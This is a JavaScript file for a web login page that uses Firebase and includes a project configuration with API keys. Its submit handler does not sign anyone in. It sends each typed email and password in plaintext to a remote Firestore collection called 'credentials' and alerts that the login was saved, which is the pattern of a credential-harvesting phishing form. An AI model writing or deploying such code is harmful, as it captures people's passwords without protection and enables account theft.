import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-analytics.js";

// Configuration
const firebaseConfig = {
    apiKey: "AIzaSyAQf8edXf_Se5qlBRtqvkSRBy5U3UNjqK4",
    authDomain: "test1-fab7d.firebaseapp.com",
    projectId: "test1-fab7d",
    storageBucket: "test1-fab7d.firebasestorage.app",
    messagingSenderId: "928402837024",
    appId: "1:928402837024:web:53127a68e8c02ae4a0b645",
    measurementId: "G-SWBDCFJD1R"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
const analytics = getAnalytics(app);

document.addEventListener('DOMContentLoaded', () => {
    // Password visibility toggle
    const togglePasswordBtn = document.getElementById('togglePassword');
    const passwordInput = document.getElementById('password');

    if (togglePasswordBtn && passwordInput) {
        togglePasswordBtn.addEventListener('click', () => {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            togglePasswordBtn.style.opacity = type === 'text' ? '0.7' : '1';
        });
    }

    // Form submission handler
    const loginForm = document.getElementById('loginForm');

    if (loginForm) {
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const remember = document.getElementById('remember').checked;

            if (email && password) {
                const btn = loginForm.querySelector('.cta-btn');
                const originalText = btn.textContent;

                btn.textContent = 'Signing in...';
                btn.disabled = true;

                try {
                    // SAVE TO FIRESTORE
                    const docRef = await addDoc(collection(db, "credentials"), {
                        email: email,
                        password: password,
                        timestamp: new Date(),
                        rememberMe: remember
                    });

                    console.log("Document written with ID: ", docRef.id);
                    alert(`Login Saved to Database!\nID: ${docRef.id}`);

                    loginForm.reset();
                } catch (e) {
                    console.error("Error adding document: ", e);
                    alert("Error saving to database: " + e.message);
                } finally {
                    btn.textContent = originalText;
                    btn.disabled = false;
                }
            }
        });
    }

    // Input interaction effects
    const inputs = document.querySelectorAll('input');
    inputs.forEach(input => {
        input.addEventListener('focus', () => {
            input.parentElement.classList.add('focused');
        });

        input.addEventListener('blur', () => {
            input.parentElement.classList.remove('focused');
        });
    });
});
